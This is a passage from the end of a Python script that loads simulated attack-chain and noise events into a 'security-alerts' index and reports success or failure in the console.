    return success


if __name__ == "__main__":
    console.print("[bold]Loading attack chain + noise events into security-alerts...[/]\n")
    try:
        total = load_attack_data()
        console.print(f"\n[bold green]Done.[/] {total} events loaded.")
    except Exception as e:
        console.print(f"\n[bold red]Failed to load data:[/] {e}")
        sys.exit(1)
